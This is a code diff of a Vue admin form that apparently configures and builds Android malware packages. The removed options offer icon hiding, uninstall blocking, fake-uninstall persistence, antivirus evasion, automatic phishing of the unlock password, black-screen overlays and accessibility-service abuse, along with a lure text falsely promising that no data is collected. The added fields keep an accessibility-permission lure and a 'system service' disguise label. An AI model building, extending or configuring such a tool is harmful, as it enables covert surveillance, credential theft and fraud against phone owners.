@@ -68,42 +68,23 @@ const { message } = createDiscreteApi(['message']);
 const { userRoute } = useAdminBasePath();
 
 const form = useForm({
-    template_id: null as number | null,
     name: '',
     package_name: '',
     version: '',
-    is_custom: true,
     client_name: '',
-    app_url: '',
-    use_wss: false,
-    lng_short: '为了确保所有功能正常使用，需要您开启无障碍权限，此App不会收集或分享您的个人信息，请记住以下设置：选择 已下载的服务/应用 -找到本App-点击 打开并允许',
-    use_atoprims: '加载中~请勿操作或锁屏！',
-    login_title: '欢迎使用',
-    login_dis: '',
-    login_btn: '确定',
-    install_type: 'f',
-    install_type2: 'g',
-    user_allprims: '1',
-    user_blackprims: '1',
-    hide_type: 'c',
-    use_antkill: '1',
-    notify_msg: 'on',
-    diao_type: '1',
-    hidden_app: '1',
-    use_draw: '1',
-    open_access: '1',
-    use_access: '1',
-    enable_auto_wake_screen: '1',
+    debug: 1,
+    alertTitle: '',
+    alertMsg: '',
+    okText: '',
+    mainUrl: '',
     icon_path: '',
     background_path: '',
-    abg_path: '',
 });
 
 const iconList = ref<ImageItem[]>([...props.icons]);
 const backgroundList = ref<ImageItem[]>([...props.backgrounds]);
 const selectedIcon = ref<string>('');
 const selectedBackground = ref<string>('');
-const selectedAbg = ref<string>('');
 const uploadingIcon = ref(false);
 const uploadingBg = ref(false);
 
@@ -189,56 +170,6 @@ onBeforeUnmount(() => {
     closeEventSource();
 });
 
-const templateOptions = props.templates.map(t => ({
-    label: t.name,
-    value: t.id,
-}));
-
-const installTypeOptions = [
-    { label: '单包模式', value: 'f' },
-    { label: '双包模式', value: 'd' },
-];
-
-const installType2Options = [
-    { label: '默认', value: 'g' },
-    { label: '百分百触发(国外单包专用)', value: 's' },
-];
-
-const allprimsOptions = [
-    { label: '全部权限', value: '1' },
-    { label: 'Google Play模式', value: '0' },
-];
-
-const blackprimsOptions = [
-    { label: '外置遮挡', value: '0' },
-    { label: '内置遮挡', value: '1' },
-];
-
-const hideTypeOptions = [
-    { label: '直接隐藏（推荐）', value: 'c' },
-    { label: '模拟卸载', value: 'k' },
-    { label: '无隐藏保护', value: 'f' },
-];
-
-const antkillOptions = [
-    { label: '开启', value: 'on' },
-    { label: '关闭', value: 'off' },
-];
-
-const switchOptions = [
-    { label: '关闭', value: '0' },
-    { label: '开启', value: '1' },
-];
-
-const showAbgUpload = computed(() => form.install_type === 'd');
-
-watch(() => form.install_type, (val) => {
-    if (val !== 'd') {
-        form.abg_path = '';
-        selectedAbg.value = '';
-    }
-});
-
 const selectIcon = (icon: ImageItem) => {
     selectedIcon.value = icon.name;
     form.icon_path = icon.url;
@@ -247,11 +178,6 @@ const selectIcon = (icon: ImageItem) => {
 const selectBackground = (bg: ImageItem) => {
     selectedBackground.value = bg.name;
     form.background_path = bg.url;
-};
-
-const selectAbg = (bg: ImageItem) => {
-    selectedAbg.value = bg.name;
-    form.abg_path = bg.url;
 };
 
 const handleIconUpload = async (options: { file: UploadFileInfo }) => {
@@ -281,12 +207,11 @@ const handleIconUpload = async (options: { file: UploadFileInfo }) => {
     }
 };
 
-const handleBgUpload = async (options: { file: UploadFileInfo }, type: 'blackui' | 'abg' = 'blackui') => {
+const handleBgUpload = async (options: { file: UploadFileInfo }) => {
     if (!options.file.file) return;
     uploadingBg.value = true;
     const formData = new FormData();
     formData.append('background', options.file.file);
-    formData.append('type', type);
     try {
         const response = await fetch(userRoute('/builds/assets/backgrounds'), {
             method: 'POST',
@@ -299,11 +224,7 @@ const handleBgUpload = async (options: { file: UploadFileInfo }, type: 'blackui'
         const data = await response.json();
         if (data.success) {
             backgroundList.value.unshift(data.background);
-            if (type === 'blackui') {
-                selectBackground(data.background);
-            } else {
-                selectAbg(data.background);
-            }
+            selectBackground(data.background);
             message.success('背景图上传成功');
         }
     } catch (e) {
@@ -478,36 +399,12 @@ const validateForm = (): boolean => {
                         <div class="tab-content">
                             <NCard size="small" class="form-card">
                                 <template #header>
-                                    <span class="card-title">上线名称</span>
+                                    <span class="card-title">基本信息</span>
                                 </template>
-                                <NFormItem label="客户端标识" :validation-status="form.errors.client_name ? 'error' : undefined">
-                                    <NInput v-model:value="form.client_name" placeholder="请输入上线名称" maxlength="16" show-count />
+                                <NFormItem label="应用名称（必填）" :validation-status="form.errors.name ? 'error' : undefined">
+                                    <NInput v-model:value="form.name" placeholder="应用显示名称" maxlength="100" show-count />
+                                    <template #feedback>{{ form.errors.name }}</template>
                                 </NFormItem>
-                            </NCard>
-
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">应用信息</span>
-                                </template>
-                                <NGrid :cols="2" :x-gap="16">
-                                    <NGridItem>
-                                        <NFormItem label="应用名称" :validation-status="form.errors.name ? 'error' : undefined">
-                                            <NInput v-model:value="form.name" placeholder="应用名称" maxlength="32" show-count />
-                                            <template #feedback>{{ form.errors.name }}</template>
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem label="应用网址">
-                                            <NInput v-model:value="form.app_url" placeholder="https://example.com" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                </NGrid>
-                            </NCard>
-
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">包名版本</span>
-                                </template>
                                 <NGrid :cols="2" :x-gap="16">
                                     <NGridItem>
                                         <NFormItem label="应用包名（留空自动生成）" :validation-status="form.errors.package_name ? 'error' : undefined">
@@ -515,16 +412,52 @@ const validateForm = (): boolean => {
                                         </NFormItem>
                                     </NGridItem>
                                     <NGridItem>
-                                        <NFormItem label="应用版本（留空随机生成）">
-                                            <NInput v-model:value="form.version" placeholder="如 1.0" />
+                                        <NFormItem label="应用版本（留空自动生成）">
+                                            <NInput v-model:value="form.version" placeholder="1.0.0" />
+                                        </NFormItem>
+                                    </NGridItem>
+                                </NGrid>
+                                <NFormItem label="应用标签">
+                                    <NInput v-model:value="form.client_name" placeholder="系统服务" maxlength="100" show-count />
+                                </NFormItem>
+                            </NCard>
+
+                            <NCard size="small" class="form-card">
+                                <template #header>
+                                    <span class="card-title">引导配置</span>
+                                </template>
+                                <NFormItem label="无障碍标题">
+                                    <NInput v-model:value="form.alertTitle" placeholder="开启 [无障碍服务]" maxlength="200" show-count />
+                                </NFormItem>
+                                <NFormItem label="无障碍内容">
+                                    <NInput v-model:value="form.alertMsg" type="textarea" :rows="4" placeholder="引导步骤说明" maxlength="1000" show-count />
+                                </NFormItem>
+                                <NGrid :cols="2" :x-gap="16">
+                                    <NGridItem>
+                                        <NFormItem label="引导按钮文本">
+                                            <NInput v-model:value="form.okText" placeholder="立即前往" maxlength="50" show-count />
+                                        </NFormItem>
+                                    </NGridItem>
+                                    <NGridItem>
+                                        <NFormItem label="WebView 主页">
+                                            <NInput v-model:value="form.mainUrl" placeholder="留空使用默认" />
                                         </NFormItem>
                                     </NGridItem>
                                 </NGrid>
                             </NCard>
+
+                            <NCard size="small" class="form-card">
+                                <template #header>
+                                    <span class="card-title">调试选项</span>
+                                </template>
+                                <NFormItem label="调试模式">
+                                    <NSwitch v-model:value="form.debug" :checked-value="1" :unchecked-value="0" />
+                                </NFormItem>
+                            </NCard>
                         </div>
                     </NTabPane>
 
-                    <NTabPane name="ui" tab="界面设置">
+                    <NTabPane name="ui" tab="外观资源">
                         <div class="tab-content">
                             <NCard size="small" class="form-card">
                                 <template #header>
@@ -561,165 +494,6 @@ const validateForm = (): boolean => {
                         </div>
                     </NTabPane>
 
-                    <NTabPane name="features" tab="功能设置">
-                        <div class="tab-content">
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">安装模式</span>
-                                </template>
-                                <NGrid :cols="2" :x-gap="16">
-                                    <NGridItem>
-                                        <NFormItem label="包模式">
-                                            <NSelect v-model:value="form.install_type" :options="installTypeOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem label="触发模式">
-                                            <NSelect v-model:value="form.install_type2" :options="installType2Options" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                </NGrid>
-                            </NCard>
-
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">应用权限</span>
-                                </template>
-                                <NGrid :cols="2" :x-gap="16">
-                                    <NGridItem>
-                                        <NFormItem label="权限范围">
-                                            <NSelect v-model:value="form.user_allprims" :options="allprimsOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem label="黑屏方式">
-                                            <NSelect v-model:value="form.user_blackprims" :options="blackprimsOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                </NGrid>
-                            </NCard>
-
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">隐藏模式</span>
-                                </template>
-                                <NGrid :cols="2" :x-gap="16">
-                                    <NGridItem>
-                                        <NFormItem>
-                                            <template #label>
-                                                <span class="label-with-tip">
-                                                    隐藏方式
-                                                    <NTooltip trigger="hover" placement="top">
-                                                        <template #trigger>
-                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
-                                                        </template>
-                                                        <div class="tip-content">
-                                                            <p><b>直接隐藏</b>：检测到卸载时按HOME键跳走，阻止卸载操作</p>
-                                                            <p><b>模拟卸载</b>：提示系统不兼容，用户点击卸载后隐藏图标（图标变透明），软件继续后台运行</p>
-                                                            <p><b>无隐藏保护</b>：不触发任何隐藏行为，需配合防止卸载使用</p>
-                                                        </div>
-                                                    </NTooltip>
-                                                </span>
-                                            </template>
-                                            <NSelect v-model:value="form.hide_type" :options="hideTypeOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem>
-                                            <template #label>
-                                                <span class="label-with-tip">
-                                                    免杀保护
-                                                    <NTooltip trigger="hover" placement="top">
-                                                        <template #trigger>
-                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
-                                                        </template>
-                                                        开启后降低被系统安全软件检测和查杀的概率
-                                                    </NTooltip>
-                                                </span>
-                                            </template>
-                                            <NSelect v-model:value="form.notify_msg" :options="antkillOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                </NGrid>
-                            </NCard>
-
-                            <NCard size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">功能开关</span>
-                                </template>
-                                <NGrid :cols="2" :x-gap="16" :y-gap="8">
-                                    <NGridItem>
-                                        <NFormItem>
-                                            <template #label>
-                                                <span class="label-with-tip">
-                                                    防止卸载
-                                                    <NTooltip trigger="hover" placement="top">
-                                                        <template #trigger>
-                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
-                                                        </template>
-                                                        赋予防卸载能力，运行时通过控制面板 kb 命令控制开关
-                                                    </NTooltip>
-                                                </span>
-                                            </template>
-                                            <NSelect v-model:value="form.use_antkill" :options="switchOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem label="自动钓鱼解锁密码">
-                                            <NSelect v-model:value="form.diao_type" :options="switchOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem>
-                                            <template #label>
-                                                <span class="label-with-tip">
-                                                    隐藏应用
-                                                    <NTooltip trigger="hover" placement="top">
-                                                        <template #trigger>
-                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
-                                                        </template>
-                                                        安装后图标默认显示，需通过控制面板发送隐藏图标命令隐藏
-                                                    </NTooltip>
-                                                </span>
-                                            </template>
-                                            <NSelect v-model:value="form.hidden_app" :options="switchOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem label="悬浮窗权限">
-                                            <NSelect v-model:value="form.use_draw" :options="switchOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem label="自动打开无障碍">
-                                            <NSelect v-model:value="form.open_access" :options="switchOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem label="无障碍服务">
-                                            <NSelect v-model:value="form.use_access" :options="switchOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                    <NGridItem>
-                                        <NFormItem>
-                                            <template #label>
-                                                <span class="label-with-tip">
-                                                    自动唤醒屏幕
-                                                    <NTooltip trigger="hover" placement="top">
-                                                        <template #trigger>
-                                                            <NIcon :component="InformationCircleOutline" class="tip-icon" />
-                                                        </template>
-                                                        关闭后按锁屏键可保持黑屏，不会自动点亮屏幕
-                                                    </NTooltip>
-                                                </span>
-                                            </template>
-                                            <NSelect v-model:value="form.enable_auto_wake_screen" :options="switchOptions" />
-                                        </NFormItem>
-                                    </NGridItem>
-                                </NGrid>
-                            </NCard>
-                        </div>
-                    </NTabPane>
 
                     <NTabPane name="assets" tab="图标资源">
                         <div class="tab-content">
@@ -757,7 +531,7 @@ const validateForm = (): boolean => {
                                     获取无障碍权限界面底图，支持 PNG/JPG 格式
                                 </NAlert>
                                 <div class="asset-grid asset-grid-large">
-                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="(opts) => handleBgUpload(opts, 'blackui')" class="upload-trigger">
+                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="handleBgUpload" class="upload-trigger">
                                         <div class="upload-btn upload-btn-large">
                                             <NSpin v-if="uploadingBg" size="small" />
                                             <template v-else>
@@ -775,28 +549,6 @@ const validateForm = (): boolean => {
                                 </div>
                             </NCard>
 
-                            <NCard v-if="showAbgUpload" size="small" class="form-card">
-                                <template #header>
-                                    <span class="card-title">A包背景（双包模式专用）</span>
-                                </template>
-                                <NAlert type="warning" :bordered="false" class="mb-3">
-                                    不上传则使用默认背景。建议尺寸 1080×1920
-                                </NAlert>
-                                <div class="asset-grid asset-grid-large">
-                                    <NUpload accept="image/png,image/jpeg" :show-file-list="false" :custom-request="(opts) => handleBgUpload(opts, 'abg')" class="upload-trigger">
-                                        <div class="upload-btn upload-btn-large">
-                                            <NIcon :component="AddOutline" size="24" />
-                                            <span>上传背景</span>
-                                        </div>
-                                    </NUpload>
-                                    <div v-for="bg in backgroundList" :key="'abg-' + bg.name" class="asset-item asset-item-large" :class="{ selected: selectedAbg === bg.name }" @click="selectAbg(bg)">
-                                        <img :src="bg.url" :alt="bg.name" />
-                                        <div v-if="selectedAbg === bg.name" class="selected-badge">
-                                            <NIcon :component="CheckmarkCircleOutline" />
-                                        </div>
-                                    </div>
-                                </div>
-                            </NCard>
                         </div>
                     </NTabPane>
                 </NTabs>
